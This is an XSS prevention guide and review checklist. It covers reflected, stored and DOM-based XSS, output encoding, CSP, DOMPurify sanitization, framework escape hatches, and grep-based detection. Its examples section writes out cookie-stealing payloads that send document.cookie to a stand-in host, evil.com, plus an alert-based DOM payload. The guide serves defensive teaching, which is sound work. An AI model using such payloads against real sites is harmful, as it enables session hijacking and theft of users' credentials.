# XSS Prevention Guide

Language-agnostic review checklist. Apply to every PR rendering user-controlled content.

---

## XSS Types

### 1. Reflected XSS

Malicious input in URL parameters or form fields reflected back in the response without encoding.

```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

Server echoes the `q` parameter directly into HTML. User clicks link, script executes.

### 2. Stored (Persistent) XSS

Malicious input stored in database, rendered to other users later.

```
Comment field: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

Every user viewing the comment triggers the script. Most dangerous type — affects all visitors.

### 3. DOM-Based XSS

Vulnerability exists entirely in client-side JavaScript. Server response is safe; the DOM sink is not.

```javascript
// VULNERABLE - innerHTML sink
document.getElementById("output").innerHTML = location.hash.substring(1);

// URL: https://example.com/page#<img src=x onerror=alert(1)>
// Script pulls payload from URL fragment into DOM
```

Common sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with string arg.

---

## Universal Prevention

### 1. Output Encoding

Encode before inserting into HTML context. Encoding rules differ by context.

| Context | Encoding | Example |
|---------|----------|---------|
| HTML body | HTML entity | `<` becomes `&lt;` |
| HTML attribute | Attribute encoding | `"` becomes `&quot;` |
| JavaScript | JS encoding | `<` becomes `\x3c` |
| URL | URL encoding | `<` becomes `%3C` |
| CSS | CSS encoding | `<` becomes `\3c` |

**Every framework auto-encodes by default.** XSS happens when you opt out.

### 2. Content Security Policy (CSP)

Last line of defense. Restricts where scripts can load and execute.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```

### 3. Input Sanitization (DOMPurify)

For rich text / HTML input, sanitize instead of encode.

```javascript
import DOMPurify from "dompurify";

// VULNERABLE - raw HTML
element.innerHTML = userInput;

// SAFE - sanitized
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 4. Framework Auto-Escaping

Modern frameworks escape by default. Don't opt out.

| Framework | Auto-escapes | Escape hatch (dangerous) |
|-----------|-------------|--------------------------|
| React | `{expression}` in JSX | `dangerouslySetInnerHTML` |
| Vue | `{{ }}` interpolation | `v-html` directive |
| Angular | `{{ }}` binding | `bypassSecurityTrust*` |
| Svelte | `{expression}` | `{@html}` |
| Django | `{{ }}` template | `mark_safe()` |
| Go `html/template` | `{{.}}` | `template.HTML()` |
| Handlebars | `{{}}` | `{{{ }}}` (triple braces) |

Review check: **grep for escape hatches. Every usage needs justification.**

---

## Framework Escape Hatches

### React: dangerouslySetInnerHTML

```jsx
// VULNERABLE - raw HTML from user
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// SAFE - sanitized
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

### Vue: v-html

```html
<!-- VULNERABLE -->
<div v-html="userContent"></div>

<!-- SAFE - sanitized -->
<div v-html="sanitize(userContent)"></div>
```

### Angular: bypassSecurityTrust

```typescript
// VULNERABLE
this.sanitized = this.dom.bypassSecurityTrustHtml(userContent);

// SAFE - use DomSanitizer only with sanitization
this.sanitized = this.sanitizer.sanitize(SecurityContext.HTML, userContent);
```

### Svelte: {@html}

```svelte
<!-- VULNERABLE -->
{@html userContent}

<!-- SAFE - sanitized -->
{@html DOMPurify.sanitize(userContent)}
```

### Django: mark_safe()

```python
from django.utils.safestring import mark_safe

# VULNERABLE
return mark_safe(f"<div>{user_input}</div>")

# SAFE - use template auto-escaping, or sanitize
from bleach import clean
return mark_safe(clean(user_input, tags=["b", "i", "a"], attributes={"a": ["href"]}))
```

### Go: template.HTML()

```go
// VULNERABLE
tmpl.Execute(w, template.HTML(userInput))

// SAFE - use html/template (auto-escapes) or bluemonday
p := bluemonday.UGCPolicy()
tmpl.Execute(w, p.Sanitize(userInput))
```

---

## SSR Gotcha: Script Tag Injection

When embedding JSON in HTML for server-side rendering, `</script>` inside string values breaks the parser.

```javascript
// VULNERABLE - user input containing </script> breaks out
const data = JSON.stringify({ comment: userInput });
res.send(`<script>window.__DATA__ = ${data}</script>`);

// SAFE - escape </script> in JSON output
const safeData = data.replace(/<\//g, "<\\/");
res.send(`<script>window.__DATA__ = ${safeData}</script>`);
```

Most SSR frameworks handle this. Manual template injection does not.

---

## CSP Anti-Patterns

```http
# BAD - wide open
Content-Security-Policy: default-src *

# BAD - inline scripts allowed (XSS via inline injection)
Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline'

# BAD - eval allowed (XSS via eval injection)
Content-Security-Policy: default-src 'self'; script-src 'unsafe-eval'

# GOOD - strict policy
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'
```

Review check: **grep CSP headers for `unsafe-inline` and `unsafe-eval`. If present, file a ticket to remove.**

---

## Input Validation vs Output Encoding

These are different concerns. Both are needed.

| Concern | Purpose | Where |
|---------|---------|-------|
| Input validation | Reject malformed data | API boundary, before storage |
| Output encoding | Prevent injection on render | Template layer, at every output point |

Input validation catches: wrong type, wrong length, wrong format.
Output encoding prevents: `<script>` in a comment field rendering as HTML.

**Validation without encoding is incomplete.** Data that passes validation can still contain `<>` characters in valid formats (names, addresses, descriptions).

---

## Detection

### Static Analysis

```bash
# Grep for escape hatches
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx"
grep -rn "v-html" --include="*.vue"
grep -rn "bypassSecurityTrust" --include="*.ts" --include="*.html"
grep -rn "{@html" --include="*.svelte"
grep -rn "mark_safe" --include="*.py"
grep -rn "template\.HTML" --include="*.go"
grep -rn "innerHTML" --include="*.ts" --include="*.js" --include="*.tsx"

# Grep for DOM sinks
grep -rn "document\.write" --include="*.js" --include="*.ts"
grep -rn "\.innerHTML\s*=" --include="*.js" --include="*.ts"
grep -rn "\.outerHTML\s*=" --include="*.js" --include="*.ts"
```

### Tools

| Tool | Language | What it catches |
|------|----------|----------------|
| ESLint no-unsanitized | JS/TS | Unsafe innerHTML, eval |
| Semgrep | Any | Custom XSS rules |
| Dlint | Python | XSS patterns |
| GoAST Scanner | Go | Template injection |

---

## Review Checklist

- [ ] No XSS escape hatches without sanitization (grep above)
- [ ] CSP header present and strict (no unsafe-inline/eval)
- [ ] Rich text input sanitized with DOMPurify (or equivalent)
- [ ] JSON in HTML rendered with script tag escaping
- [ ] Output encoding applied at every render point
- [ ] Input validation at API boundary (type, length, format)
- [ ] No `innerHTML` / `document.write` with user data
- [ ] SSR framework auto-escapes confirmed (not overridden)
- [ ] `eval()` / `Function()` / `setTimeout(string)` removed
- [ ] URL parameters encoded in href attributes (not raw)
